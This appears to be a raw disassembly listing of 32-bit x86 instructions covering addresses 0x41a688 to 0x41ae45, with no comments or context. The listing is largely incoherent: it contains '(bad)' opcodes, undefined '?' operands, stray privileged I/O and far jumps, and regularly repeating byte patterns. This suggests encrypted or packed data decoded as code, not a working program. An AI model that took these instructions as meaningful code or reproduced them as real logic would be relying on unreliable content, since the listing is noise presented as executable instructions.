  41a688:	imul   BYTE PTR [esi-0x1]
  41a68b:	xor    eax,0x65403c42
  41a690:	addr16 mov ds:0xd875,eax
  41a694:	leave  
  41a695:	or     al,dl
  41a697:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a698:	mov    DWORD PTR [edi],esi
  41a69a:	inc    DWORD PTR ds:0x4041cc
  41a6a0:	add    BYTE PTR [eax],al
  41a6a2:	inc    eax
  41a6a3:	inc    eax
  41a6a4:	inc    ebx
  41a6a5:	bound  eax,QWORD PTR [eax]
  41a6a7:	inc    eax
  41a6a8:	inc    eax
  41a6a9:	add    eax,0x62434162
  41a6ae:	inc    eax
  41a6af:	js     0x41a6c1
  41a6b1:	inc    ecx
  41a6b2:	add    eax,0x5404325
  41a6b7:	bound  eax,QWORD PTR [eax+0x40]
  41a6ba:	inc    ecx
  41a6bb:	inc    ebx
  41a6bc:	push   edx
  41a6bd:	fcom   QWORD PTR [eax-0x5e71f294]
  41a6c3:	jne    0x41a69a
  41a6c5:	pop    ebp
  41a6c6:	push   edx
  41a6c7:	bound  edx,QWORD PTR [edi+eax*4]
  41a6ca:	and    al,0xff
  41a6cc:	ret    0xca40
  41a6cf:	inc    edx
  41a6d0:	test   BYTE PTR [ecx+eiz*8+0x48],0x29
  41a6d5:	push   0x48
  41a6d7:	sar    ecx,1
  41a6d9:	and    eax,0x436241
  41a6de:	adc    BYTE PTR [eax+0x0],al
  41a6e1:	add    eax,0x62410040
  41a6e6:	inc    eax
  41a6e7:	add    BYTE PTR [ebx-0x34],al
  41a6ea:	inc    eax
  41a6eb:	add    eax,0x78434040
  41a6f0:	bound  eax,QWORD PTR [ecx+0x78]
  41a6f3:	add    eax,0x62404043
  41a6f8:	ret    
  41a6f9:	lods   eax,DWORD PTR ds:[esi]
  41a6fa:	aas    
  41a6fb:	gs xchg esp,eax
  41a6fd:	adc    eax,0x77dea2c4
  41a702:	dec    eax
  41a703:	xor    eax,0x614fc805
  41a708:	mov    al,0x9b
  41a70a:	aas    
  41a70b:	fmul   st,st(3)
  41a70d:	pusha  
  41a70e:	inc    eax
  41a70f:	mov    dh,0x38
  41a711:	in     eax,0x75
  41a713:	push   edx
  41a714:	nop
  41a715:	and    BYTE PTR [ecx+eax*2+0x62400540],0x43
  41a71d:	inc    ebx
  41a71e:	add    eax,0x62004040
  41a723:	inc    eax
  41a724:	add    BYTE PTR [ecx+0x40],al
  41a727:	inc    ebx
  41a728:	test   BYTE PTR ds:0x58054041,ah
  41a72e:	inc    eax
  41a72f:	inc    eax
  41a730:	bound  eax,QWORD PTR [eax+0x66]
  41a733:	inc    ecx
  41a734:	inc    eax
  41a735:	add    eax,0x23b1a000
  41a73a:	call   DWORD PTR [esi+0x41]
  41a73d:	ret    
  41a73e:	inc    ebx
  41a73f:	cmp    dl,bh
  41a741:	xor    eax,0x4842acbf
  41a746:	push   cs
  41a747:	test   eax,ebp
  41a749:	aas    
  41a74a:	dec    edi
  41a74b:	xor    eax,0x66c015c0
  41a750:	jmp    0x5819f8bc
  41a755:	(bad)  
  41a756:	imul   ebx,DWORD PTR [esi+0x40430000],0x41100562
  41a760:	inc    eax
  41a761:	and    eax,0x543cc00
  41a766:	bound  esp,QWORD PTR ds:0x40004040
  41a76c:	inc    eax
  41a76d:	inc    ecx
  41a76e:	inc    ecx
  41a76f:	add    eax,0x78434025
  41a774:	bound  eax,QWORD PTR [eax-0x7c]
  41a777:	inc    eax
  41a778:	inc    ecx
  41a779:	jge    0x41a71d
  41a77b:	and    al,0x52
  41a77d:	and    al,0x4f
  41a77f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a780:	pop    edx
  41a781:	jle    0x41a7f7
  41a783:	icebp  
  41a784:	dec    eax
  41a785:	bound  ecx,QWORD PTR [edx+0xe]
  41a788:	mov    ebp,0x9c405021
  41a78d:	mov    bh,0x3f
  41a78f:	rcr    DWORD PTR [ecx+ebx*2-0x57bb2d53],0x1a
  41a797:	arpl   WORD PTR [ebp+eax*2+0x4e],dx
  41a79b:	sub    DWORD PTR [edx+edx*1],ebp
  41a79e:	mov    ecx,0xa9caa576
  41a7a3:	pop    ebp
  41a7a4:	inc    ecx
  41a7a5:	inc    eax
  41a7a6:	inc    eax
  41a7a7:	inc    ebx
  41a7a8:	int3   
  41a7a9:	add    BYTE PTR ds:0x56240,al
  41a7af:	inc    ebx
  41a7b0:	inc    eax
  41a7b1:	inc    eax
  41a7b2:	add    BYTE PTR [ecx+0x62],al
  41a7b5:	bound  eax,QWORD PTR [eax]
  41a7b7:	int3   
  41a7b8:	inc    eax
  41a7b9:	inc    ebx
  41a7ba:	add    eax,0x43624041
  41a7bf:	adc    BYTE PTR [ecx+0x5],al
  41a7c2:	inc    eax
  41a7c3:	add    BYTE PTR [ebx+eax*8+0x4f529a8c],bl
  41a7ca:	shl    DWORD PTR [edx+0x42],1
  41a7cd:	dec    eax
  41a7ce:	pushf  
  41a7cf:	adc    eax,0xd6b2328
  41a7d4:	jmp    0x53c7:0x2e32050d
  41a7db:	data16 mov al,ds:0x1b4e53fe
  41a7e1:	popa   
  41a7e2:	inc    edx
  41a7e3:	xor    eax,0x644f4f62
  41a7e8:	repnz fbld TBYTE PTR [edx+0x43]
  41a7ec:	inc    eax
  41a7ed:	adc    BYTE PTR ds:0x4158cc40,al
  41a7f3:	inc    ebx
  41a7f4:	bound  eax,QWORD PTR [ecx+0x40]
  41a7f7:	add    eax,0x4140
  41a7fc:	and    eax,0x40400062
  41a801:	add    eax,0x84404340
  41a806:	int3   
  41a807:	js     0x41a809
  41a809:	inc    ecx
  41a80a:	adc    BYTE PTR [edx+0xf],ah
  41a80d:	lock fcomp st(1)
  41a810:	push   ebx
  41a811:	es cli 
  41a813:	dec    eax
  41a814:	cmc    
  41a815:	and    al,0x52
  41a817:	mov    esp,0x7c98803c
  41a81c:	add    eax,0x162ebae
  41a821:	pop    ss
  41a822:	or     eax,0x8c762143
  41a827:	inc    ebx
  41a828:	mov    eax,0xff2e414f
  41a82d:	test   DWORD PTR [eax-0x30],0x2dc326c3
  41a834:	and    BYTE PTR [esi+0x3c],dh
  41a837:	dec    eax
  41a838:	dec    eax
  41a839:	inc    esi
  41a83a:	xor    eax,0x7cff6cca
  41a83f:	je     0x41a846
  41a841:	or     al,0x0
  41a843:	inc    eax
  41a844:	inc    ecx
  41a845:	inc    eax
  41a846:	inc    ebx
  41a847:	bound  ax,DWORD PTR ds:0x40434100
  41a84e:	add    eax,0x40054062
  41a853:	bound  eax,QWORD PTR [ecx+0x40]
  41a856:	inc    ebx
  41a857:	inc    eax
  41a858:	add    eax,0x25405841
  41a85d:	bound  eax,QWORD PTR [eax+0x43]
  41a860:	inc    eax
  41a861:	adc    cl,bh
  41a863:	sbb    eax,0xd5c57667
  41a868:	(bad)  
  41a869:	nop
  41a86a:	xchg   esi,eax
  41a86b:	jecxz  0x41a8b0
  41a86d:	push   DWORD PTR [esi]
  41a86f:	or     cl,BYTE PTR [edi-0x3f]
  41a872:	add    eax,0xfe76211f
  41a877:	lock lods al,BYTE PTR ds:[esi]
  41a879:	pushf  
  41a87a:	inc    ecx
  41a87b:	push   0x57
  41a87d:	inc    DWORD PTR [esp+esi*4-0x35]
  41a881:	mov    eax,0x1a62e348
  41a886:	sub    al,0xa8
  41a888:	adc    eax,0x279bdcbb
  41a88d:	aas    
  41a88e:	jp     0x41a903
  41a890:	dec    esi
  41a891:	add    eax,0x43414003
  41a896:	inc    eax
  41a897:	add    eax,0x43406262
  41a89c:	inc    ecx
  41a89d:	adc    BYTE PTR [eax],al
  41a89f:	inc    eax
  41a8a0:	add    eax,0x43000562
  41a8a5:	add    BYTE PTR [ecx+0x40],al
  41a8a8:	inc    eax
  41a8a9:	add    eax,0x400062
  41a8ae:	inc    ebx
  41a8af:	inc    eax
  41a8b0:	js     0x41a8f3
  41a8b2:	inc    ecx
  41a8b3:	bound  eax,QWORD PTR [eax-0x6a]
  41a8b6:	dec    edx
  41a8b7:	je     0x41a8a4
  41a8b9:	or     al,BYTE PTR [eax+0x63]
  41a8bc:	clc    
  41a8bd:	sub    ah,BYTE PTR [ecx-0x5d]
  41a8c0:	lods   eax,DWORD PTR ds:[esi]
  41a8c1:	bound  eax,QWORD PTR [ecx+0x11]
  41a8c4:	xchg   esp,eax
  41a8c5:	lahf   
  41a8c6:	add    BYTE PTR [ecx],bl
  41a8c8:	xor    eax,0x4062c091
  41a8cd:	add    eax,0x40430041
  41a8d2:	inc    eax
  41a8d3:	inc    ecx
  41a8d4:	inc    eax
  41a8d5:	inc    eax
  41a8d6:	bound  eax,QWORD PTR ds:0x5624300
  41a8dc:	add    BYTE PTR [eax+0x40],al
  41a8df:	add    BYTE PTR [ecx+0x43],al
  41a8e2:	add    BYTE PTR [eax+0x41],al
  41a8e5:	add    eax,0x40436200
  41a8ea:	inc    eax
  41a8eb:	add    eax,0x49549c62
  41a8f0:	and    DWORD PTR [edx],esp
  41a8f2:	fsubr  DWORD PTR [eax+ebp*2+0x64]
  41a8f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a8f7:	fstp   QWORD PTR [ecx+0x21]
  41a8fa:	push   edx
  41a8fb:	xor    DWORD PTR [esi+0x415f9245],edx
  41a901:	inc    eax
  41a902:	add    eax,0x41624340
  41a907:	test   BYTE PTR [eax],al
  41a909:	and    eax,0x404043
  41a90e:	add    BYTE PTR ds:0x626210,al
  41a914:	add    eax,0x43404140
  41a919:	inc    eax
  41a91a:	inc    ecx
  41a91b:	add    eax,0x10664062
  41a920:	inc    ebx
  41a921:	bound  esp,QWORD PTR [ebx-0x42]
  41a924:	mov    eax,ds:0xddd4c84
  41a929:	aad    0xf7
  41a92b:	sbb    BYTE PTR [eax+0x3246a1c8],ch
  41a931:	pop    edx
  41a932:	dec    edi
  41a933:	and    DWORD PTR ds:0x82d08142,esi
  41a939:	dec    esi
  41a93a:	mov    eax,ds:0x7b36d850
  41a93f:	adc    eax,0x41cc0564
  41a944:	inc    eax
  41a945:	add    BYTE PTR [eax],al
  41a947:	add    BYTE PTR [eax+0x40],al
  41a94a:	inc    ebx
  41a94b:	bound  eax,QWORD PTR [eax]
  41a94d:	inc    eax
  41a94e:	inc    eax
  41a94f:	add    eax,0x62434162
  41a954:	inc    eax
  41a955:	js     0x41a967
  41a957:	inc    ecx
  41a958:	add    eax,0x5404325
  41a95d:	bound  eax,QWORD PTR [eax+0x40]
  41a960:	inc    ecx
  41a961:	inc    ebx
  41a962:	stos   DWORD PTR es:[edi],eax
  41a963:	adc    DWORD PTR [edi+0x52],esi
  41a966:	gs inc ebp
  41a968:	call   0x51279966
  41a96d:	pop    edi
  41a96e:	out    dx,eax
  41a96f:	cs and al,0x90
  41a972:	pop    ebp
  41a973:	or     al,0x7f
  41a975:	mov    ebp,fs
  41a977:	(bad)  
  41a978:	call   0x50e2cc82
  41a97d:	dec    eax
  41a97e:	xor    al,0x68
  41a980:	jl     0x41a9be
  41a982:	outs   dx,DWORD PTR ds:[esi]
  41a983:	xchg   esp,eax
  41a984:	jg     0x41a9ab
  41a986:	inc    ecx
  41a987:	bound  eax,QWORD PTR [ebx+0x0]
  41a98a:	adc    BYTE PTR [eax+0x0],al
  41a98d:	add    eax,0x62410040
  41a992:	inc    eax
  41a993:	add    BYTE PTR [ebx-0x34],al
  41a996:	inc    eax
  41a997:	add    eax,0x78434040
  41a99c:	bound  eax,QWORD PTR [ecx+0x78]
  41a99f:	add    eax,0x62404043
  41a9a4:	cmp    al,0x7a
  41a9a6:	arpl   WORD PTR [ecx],dx
  41a9a8:	pop    es
  41a9a9:	mul    cl
  41a9ab:	jg     0x41aa21
  41a9ad:	cmp    eax,0x3654361
  41a9b2:	dec    edi
  41a9b3:	and    DWORD PTR [edi+ebx*2-0x3a714364],ebx
  41a9ba:	mov    ds:0x63c4b948,al
  41a9bf:	adc    eax,0xa0093738
  41a9c4:	xor    eax,0xf542594a
  41a9c9:	out    0xca,al
  41a9cb:	cs fmul st,st(0)
  41a9ce:	inc    ecx
  41a9cf:	shl    DWORD PTR [esi-0x5d],0x41
  41a9d3:	inc    eax
  41a9d4:	add    eax,0x43436240
  41a9d9:	add    eax,0x62004040
  41a9de:	inc    eax
  41a9df:	add    BYTE PTR [ecx+0x40],al
  41a9e2:	inc    ebx
  41a9e3:	test   BYTE PTR ds:0x58054041,ah
  41a9e9:	inc    eax
  41a9ea:	inc    eax
  41a9eb:	bound  eax,QWORD PTR [eax+0x66]
  41a9ee:	inc    ecx
  41a9ef:	inc    eax
  41a9f0:	add    eax,0x52152100
  41a9f5:	jnp    0x41aa34
  41a9f7:	cwde   
  41a9f8:	mov    WORD PTR [esi+edx*2+0x697aeba1],?
  41a9ff:	bound  esi,QWORD PTR [ebx]
  41aa01:	cld    
  41aa02:	mov    bl,0xbd
  41aa04:	mov    ebp,?
  41aa06:	sbb    al,0xbc
  41aa08:	mov    ecx,0x5654bb68
  41aa0d:	mov    BYTE PTR [edi+esi*2+0x4e66],al
  41aa14:	inc    ebx
  41aa15:	inc    eax
  41aa16:	bound  eax,QWORD PTR ds:0x25404110
  41aa1c:	add    ah,cl
  41aa1e:	inc    ebx
  41aa1f:	add    eax,0x40402562
  41aa24:	add    BYTE PTR [eax+0x40],al
  41aa27:	inc    ecx
  41aa28:	inc    ecx
  41aa29:	add    eax,0x78434025
  41aa2e:	bound  eax,QWORD PTR [eax-0x7c]
  41aa31:	inc    eax
  41aa32:	inc    ecx
  41aa33:	(bad)  
  41aa34:	and    BYTE PTR [eax*1-0x4f75a23a],ch
  41aa3b:	mov    eax,ds:0xeccb701f
  41aa40:	arpl   WORD PTR ds:0xc54e089b,ax
  41aa46:	pop    esi
  41aa47:	push   esi
  41aa48:	push   ebp
  41aa49:	(bad)
  41aa4c:	popa   
  41aa4d:	into   
  41aa4e:	aas    
  41aa4f:	dec    ebx
  41aa50:	stos   DWORD PTR es:[edi],eax
  41aa51:	xchg   esi,eax
  41aa52:	mov    eax,DWORD PTR [ecx+eax*2-0x42]
  41aa56:	outs   dx,DWORD PTR ds:[esi]
  41aa57:	fadd   QWORD PTR [ecx+0x40]
  41aa5a:	inc    eax
  41aa5b:	inc    ebx
  41aa5c:	int3   
  41aa5d:	add    BYTE PTR ds:0x56240,al
  41aa63:	inc    ebx
  41aa64:	inc    eax
  41aa65:	inc    eax
  41aa66:	add    BYTE PTR [ecx+0x62],al
  41aa69:	bound  eax,QWORD PTR [eax]
  41aa6b:	int3   
  41aa6c:	inc    eax
  41aa6d:	inc    ebx
  41aa6e:	add    eax,0x43624041
  41aa73:	adc    BYTE PTR [ecx+0x5],al
  41aa76:	inc    eax
  41aa77:	and    BYTE PTR [ebp+0x5f],0xa1
  41aa7b:	pusha  
  41aa7c:	gs stos DWORD PTR es:[edi],eax
  41aa7e:	div    DWORD PTR [ebx-0x78]
  41aa81:	cmp    ecx,DWORD PTR [ebx]
  41aa83:	and    eax,0x444f4435
  41aa88:	adc    eax,0xd8366130
  41aa8d:	xor    bh,BYTE PTR [ebx+0x35]
  41aa90:	dec    ebx
  41aa91:	pop    esp
  41aa92:	dec    eax
  41aa93:	jecxz  0x41aae7
  41aa95:	xchg   esp,eax
  41aa96:	inc    ecx
  41aa97:	inc    ebx
  41aa98:	out    0x77,al
  41aa9a:	mov    ds:0x3fc05f5b,al
  41aa9f:	imul   edi,edx,0x8ca2291f
  41aaa5:	xor    eax,0x586286c
  41aaaa:	mov    ah,BYTE PTR [edx-0x6]
  41aaad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aaae:	and    DWORD PTR [edx+0x43],esp
  41aab1:	inc    eax
  41aab2:	adc    BYTE PTR ds:0x4158cc40,al
  41aab8:	inc    ebx
  41aab9:	bound  eax,QWORD PTR [ecx+0x40]
  41aabc:	add    eax,0x4140
  41aac1:	and    eax,0x40400062
  41aac6:	add    eax,0x84404340
  41aacb:	int3   
  41aacc:	js     0x41aace
  41aace:	inc    ecx
  41aacf:	adc    BYTE PTR [edx+0xf],ah
  41aad2:	dec    eax
  41aad3:	dec    edx
  41aad4:	stos   BYTE PTR es:[edi],al
  41aad5:	loope  0x41aacd
  41aad7:	xor    eax,0xe26b417b
  41aadc:	lods   eax,DWORD PTR ds:[esi]
  41aadd:	dec    eax
  41aade:	xchg   edx,eax
  41aadf:	fld    st(5)
  41aae1:	cmp    eax,0xe23f17dd
  41aae6:	and    BYTE PTR [edx+0x2b],dl
  41aae9:	imul   edx,DWORD PTR [edi-0x7],0xcf2dbb32
  41aaf0:	fmul   st,st(4)
  41aaf2:	add    al,0x84
  41aaf4:	pusha  
  41aaf5:	addr16 jb 0x41ab2c
  41aaf8:	bound  eax,QWORD PTR [eax+ebp*2+0x5]
  41aafc:	xor    al,0x43
  41aafe:	loope  0x41ab00
  41ab00:	inc    eax
  41ab01:	inc    ecx
  41ab02:	inc    eax
  41ab03:	inc    ebx
  41ab04:	bound  ax,DWORD PTR ds:0x40434100
  41ab0b:	add    eax,0x40054062
  41ab10:	bound  eax,QWORD PTR [ecx+0x40]
  41ab13:	inc    ebx
  41ab14:	inc    eax
  41ab15:	add    eax,0x25405841
  41ab1a:	bound  eax,QWORD PTR [eax+0x43]
  41ab1d:	inc    eax
  41ab1e:	adc    BYTE PTR [esi+0x5e],ah
  41ab21:	inc    edx
  41ab22:	popa   
  41ab23:	inc    ecx
  41ab24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab26:	push   ebp
  41ab27:	xor    eax,0x4b145088
  41ab2c:	xor    eax,0xcd8e1f9
  41ab31:	xchg   edi,eax
  41ab32:	push   0x54e128e4
  41ab37:	push   edx
  41ab38:	dec    esp
  41ab39:	stos   DWORD PTR es:[edi],eax
  41ab3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab3b:	clc    
  41ab3c:	retf   0x2049
  41ab3f:	ins    DWORD PTR es:[edi],dx
  41ab40:	arpl   WORD PTR [ebp-0x55],ax
  41ab43:	sbb    BYTE PTR [edi],0xe1
  41ab46:	das    
  41ab47:	in     al,dx
  41ab48:	inc    eax
  41ab49:	inc    ecx
  41ab4a:	inc    ebx
  41ab4b:	inc    eax
  41ab4c:	add    eax,0x43406262
  41ab51:	inc    ecx
  41ab52:	adc    BYTE PTR [eax],al
  41ab54:	inc    eax
  41ab55:	add    eax,0x43000562
  41ab5a:	add    BYTE PTR [ecx+0x40],al
  41ab5d:	inc    eax
  41ab5e:	add    eax,0x400062
  41ab63:	inc    ebx
  41ab64:	inc    eax
  41ab65:	js     0x41aba8
  41ab67:	inc    ecx
  41ab68:	bound  eax,QWORD PTR [eax-0x4c]
  41ab6b:	stos   DWORD PTR es:[edi],eax
  41ab6c:	mov    esp,0x5649ef15
  41ab71:	push   cs
  41ab72:	out    0xbc,eax
  41ab74:	sub    DWORD PTR [edi+0x7],ecx
  41ab77:	and    edi,esp
  41ab79:	push   ecx
  41ab7a:	in     eax,dx
  41ab7b:	inc    edx
  41ab7c:	and    esi,edi
  41ab7e:	test   BYTE PTR [esi-0x68],0x3d
  41ab82:	arpl   WORD PTR [eax+0x48],bp
  41ab85:	cli    
  41ab86:	pop    ebp
  41ab87:	mov    ds:0xf86d68e0,eax
  41ab8c:	inc    eax
  41ab8d:	xor    bl,0x42
  41ab90:	sti    
  41ab91:	aad    0xe0
  41ab93:	bound  ebp,QWORD PTR [ebp+0xd]
  41ab96:	es loope 0x41abb8
  41ab99:	lahf   
  41ab9a:	bound  edx,QWORD PTR [eax+0x54062bc]
  41aba0:	inc    ecx
  41aba1:	add    BYTE PTR [ebx+0x40],al
  41aba4:	inc    eax
  41aba5:	inc    ecx
  41aba6:	inc    eax
  41aba7:	inc    eax
  41aba8:	bound  eax,QWORD PTR ds:0x5624300
  41abae:	add    BYTE PTR [eax+0x40],al
  41abb1:	add    BYTE PTR [ecx+0x43],al
  41abb4:	add    BYTE PTR [eax+0x41],al
  41abb7:	add    eax,0x40436200
  41abbc:	inc    eax
  41abbd:	add    eax,0x499a4f62
  41abc2:	push   eax
  41abc3:	cli    
  41abc4:	pop    es
  41abc5:	jnp    0x41abcc
  41abc7:	div    esi
  41abc9:	loope  0x41abef
  41abcb:	cli    
  41abcc:	mov    esp,0x87f9cb4c
  41abd1:	aas    
  41abd2:	outs   dx,DWORD PTR ds:[esi]
  41abd3:	xor    eax,0x414d0562
  41abd8:	inc    eax
  41abd9:	add    eax,0x41624340
  41abde:	test   BYTE PTR [eax],al
  41abe0:	and    eax,0x404043
  41abe5:	add    BYTE PTR ds:0x626210,al
  41abeb:	add    eax,0x43404140
  41abf0:	inc    eax
  41abf1:	inc    ecx
  41abf2:	add    eax,0x10664062
  41abf7:	inc    ebx
  41abf8:	(bad)  
  41abf9:	dec    BYTE PTR [ebx+0x74]
  41abfc:	inc    ebx
  41abfd:	fnstenv ds:0x470534fe
  41ac03:	popa   
  41ac04:	and    eax,0x404fa052
  41ac09:	adc    cl,BYTE PTR ss:[eax]
  41ac0c:	inc    esp
  41ac0d:	jo     0x41abe9
  41ac0f:	push   ecx
  41ac10:	inc    eax
  41ac11:	jnp    0x41ac7f
  41ac13:	and    DWORD PTR [eax+0x8],esp
  41ac16:	add    eax,0x4041cc
  41ac1b:	add    BYTE PTR [eax],al
  41ac1d:	inc    eax
  41ac1e:	inc    eax
  41ac1f:	inc    ebx
  41ac20:	bound  eax,QWORD PTR [eax]
  41ac22:	inc    eax
  41ac23:	inc    eax
  41ac24:	add    eax,0x62434162
  41ac29:	inc    eax
  41ac2a:	js     0x41ac3c
  41ac2c:	inc    ecx
  41ac2d:	add    eax,0x5404325
  41ac32:	bound  eax,QWORD PTR [eax+0x40]
  41ac35:	inc    ecx
  41ac36:	inc    ebx
  41ac37:	jb     0x41ac37
  41ac39:	sbb    ah,BYTE PTR [ebp-0x6d]
  41ac3c:	pop    esp
  41ac3d:	daa    
  41ac3e:	bound  ax,DWORD PTR [ebp+0xd]
  41ac42:	cld    
  41ac43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac44:	jecxz  0x41ac9e
  41ac46:	xor    eax,0x3cba63cb
  41ac4b:	cmp    eax,0x43624125
  41ac50:	add    BYTE PTR [eax],dl
  41ac52:	inc    eax
  41ac53:	add    BYTE PTR ds:0x62410040,al
  41ac59:	inc    eax
  41ac5a:	add    BYTE PTR [ebx-0x34],al
  41ac5d:	inc    eax
  41ac5e:	add    eax,0x78434040
  41ac63:	bound  eax,QWORD PTR [ecx+0x78]
  41ac66:	add    eax,0x62404043
  41ac6b:	add    al,0x21
  41ac6d:	fcomp  DWORD PTR [eax+0x68]
  41ac70:	sar    DWORD PTR [ecx-0x2f],0xa1
  41ac74:	inc    edx
  41ac75:	push   edx
  41ac76:	addr16 gs push ecx
  41ac79:	or     ax,0x2072
  41ac7d:	lds    ebp,FWORD PTR [edx]
  41ac7f:	pop    eax
  41ac80:	idiv   edx
  41ac82:	ret    
  41ac83:	xor    DWORD PTR [ebx],ebx
  41ac85:	jmp    0x4041:0x4d4f635f
  41ac8c:	add    eax,0x43436240
  41ac91:	add    eax,0x62004040
  41ac96:	inc    eax
  41ac97:	add    BYTE PTR [ecx+0x40],al
  41ac9a:	inc    ebx
  41ac9b:	test   BYTE PTR ds:0x58054041,ah
  41aca1:	inc    eax
  41aca2:	inc    eax
  41aca3:	bound  eax,QWORD PTR [eax+0x66]
  41aca6:	inc    ecx
  41aca7:	inc    eax
  41aca8:	add    eax,0x2179a800
  41acad:	ins    DWORD PTR es:[edi],dx
  41acae:	int3   
  41acaf:	imul   edi,DWORD PTR [ebp+ebp*4+0x65212172],0xf80d69d0
  41acba:	div    BYTE PTR [ecx+0x61]
  41acbd:	xor    eax,0x46414a44
  41acc2:	retf   
  41acc3:	and    eax,DWORD PTR ds:0x404429d8
  41acc9:	mov    ch,0x3c
  41accb:	inc    edx
  41accc:	mov    eax,ds:0x806cce52
  41acd1:	test   cl,0xe0
  41acd4:	inc    eax
  41acd5:	aad    0xa8
  41acd7:	jb     0x41ad0d
  41acd9:	adc    eax,0x4b20bf29
  41acde:	add    BYTE PTR [eax],al
  41ace0:	inc    ebx
  41ace1:	inc    eax
  41ace2:	bound  eax,QWORD PTR ds:0x25404110
  41ace8:	add    ah,cl
  41acea:	inc    ebx
  41aceb:	add    eax,0x40402562
  41acf0:	add    BYTE PTR [eax+0x40],al
  41acf3:	inc    ecx
  41acf4:	inc    ecx
  41acf5:	add    eax,0x78434025
  41acfa:	bound  eax,QWORD PTR [eax-0x7c]
  41acfd:	inc    eax
  41acfe:	inc    ecx
  41acff:	adc    DWORD PTR [edi+edi*4],esi
  41ad02:	das    
  41ad03:	in     al,dx
  41ad04:	ins    DWORD PTR es:[edi],dx
  41ad05:	sub    edi,ebp
  41ad07:	mov    eax,0xff6bf89
  41ad0c:	or     al,0x63
  41ad0e:	inc    esp
  41ad0f:	inc    ecx
  41ad10:	lds    esi,FWORD PTR [eax-0x1dded59c]
  41ad16:	sub    al,0x66
  41ad18:	dec    esp
  41ad19:	inc    eax
  41ad1a:	cli    
  41ad1b:	mov    ecx,0xe0606e77
  41ad20:	or     eax,0x2153f465
  41ad25:	push   eax
  41ad26:	int    0x64
  41ad28:	inc    BYTE PTR [eax+0xd]
  41ad2b:	adc    al,BYTE PTR [eax+0x21]
  41ad2e:	inc    ecx
  41ad2f:	inc    eax
  41ad30:	inc    eax
  41ad31:	inc    ebx
  41ad32:	int3   
  41ad33:	add    BYTE PTR ds:0x56240,al
  41ad39:	inc    ebx
  41ad3a:	inc    eax
  41ad3b:	inc    eax
  41ad3c:	add    BYTE PTR [ecx+0x62],al
  41ad3f:	bound  eax,QWORD PTR [eax]
  41ad41:	int3   
  41ad42:	inc    eax
  41ad43:	inc    ebx
  41ad44:	add    eax,0x43624041
  41ad49:	adc    BYTE PTR [ecx+0x5],al
  41ad4c:	inc    eax
  41ad4d:	sub    bl,dh
  41ad4f:	dec    edi
  41ad50:	add    BYTE PTR [edx-0x45],al
  41ad53:	mov    al,ds:0x7a209e35
  41ad58:	xor    al,bh
  41ad5a:	aam    0x27
  41ad5c:	inc    eax
  41ad5d:	push   ebp
  41ad5e:	adc    DWORD PTR [esi-0x70],eax
  41ad61:	sub    DWORD PTR [esi-0x5fca9f03],ecx
  41ad67:	arpl   ax,di
  41ad69:	stc    
  41ad6a:	mul    BYTE PTR [edx+0x1c67d86f]
  41ad70:	adc    edx,esi
  41ad72:	push   eax
  41ad73:	and    DWORD PTR [eax],ebp
  41ad75:	push   edx
  41ad76:	sub    ah,BYTE PTR [edi-0x54]
  41ad79:	add    eax,0xe6a2f692
  41ad7e:	jnp    0x41ade2
  41ad80:	inc    ebx
  41ad81:	inc    eax
  41ad82:	adc    BYTE PTR ds:0x4158cc40,al
  41ad88:	inc    ebx
  41ad89:	bound  eax,QWORD PTR [ecx+0x40]
  41ad8c:	add    eax,0x4140
  41ad91:	and    eax,0x40400062
  41ad96:	add    eax,0x84404340
  41ad9b:	int3   
  41ad9c:	js     0x41ad9e
  41ad9e:	inc    ecx
  41ad9f:	adc    BYTE PTR [edx+0xf],ah
  41ada2:	mov    cl,0xcb
  41ada4:	inc    ecx
  41ada5:	mov    al,ds:0x5bbc34a1
  41adaa:	call   0x35d62ac4
  41adaf:	sub    al,0x35
  41adb1:	and    DWORD PTR [ebx+0x4b],edx
  41adb4:	loopne 0x41adb7
  41adb6:	jle    0x41ad99
  41adb8:	fsub   DWORD PTR [edx-0x2f]
  41adbb:	adc    al,0xf8
  41adbd:	in     eax,0x61
  41adbf:	jae    0x41ae13
  41adc1:	fsubr  QWORD PTR [eax+0x76a7f048]
  41adc7:	and    ebp,edx
  41adc9:	ins    DWORD PTR es:[edi],dx
  41adca:	(bad)  
  41adcb:	ins    DWORD PTR es:[edi],dx
  41adcc:	adc    eax,0x40414000
  41add1:	inc    ebx
  41add2:	bound  ax,DWORD PTR ds:0x40434100
  41add9:	add    eax,0x40054062
  41adde:	bound  eax,QWORD PTR [ecx+0x40]
  41ade1:	inc    ebx
  41ade2:	inc    eax
  41ade3:	add    eax,0x25405841
  41ade8:	bound  eax,QWORD PTR [eax+0x43]
  41adeb:	inc    eax
  41adec:	adc    BYTE PTR [edx+eiz*8+0x7e544e37],ah
  41adf3:	inc    ebx
  41adf4:	inc    esp
  41adf5:	xchg   edi,eax
  41adf6:	test   al,0xa1
  41adf8:	std    
  41adf9:	bound  esp,QWORD PTR [ebx+0x44]
  41adfc:	iret   
  41adfd:	or     BYTE PTR [ebx-0x66],cl
  41ae00:	dec    eax
  41ae01:	arpl   WORD PTR ds:0x228c1c52,dx
  41ae07:	popa   
  41ae08:	cmp    al,0xf1
  41ae0a:	fadd   QWORD PTR [edx+edi*8-0x42]
  41ae0e:	add    edi,ebp
  41ae10:	pop    edx
  41ae11:	test   al,0x21
  41ae13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae14:	out    dx,al
  41ae15:	test   edx,0xc126864
  41ae1b:	mov    DWORD PTR ds:0xe562a1eb,ecx
  41ae21:	pushf  
  41ae22:	arpl   WORD PTR [bx+di+0x18],ax
  41ae26:	inc    eax
  41ae27:	inc    ecx
  41ae28:	inc    ebx
  41ae29:	inc    eax
  41ae2a:	add    eax,0x43406262
  41ae2f:	inc    ecx
  41ae30:	adc    BYTE PTR [eax],al
  41ae32:	inc    eax
  41ae33:	add    eax,0x43000562
  41ae38:	add    BYTE PTR [ecx+0x40],al
  41ae3b:	inc    eax
  41ae3c:	add    eax,0x400062
  41ae41:	inc    ebx
  41ae42:	inc    eax
  41ae43:	js     0x41ae86
  41ae45:	inc    ecx
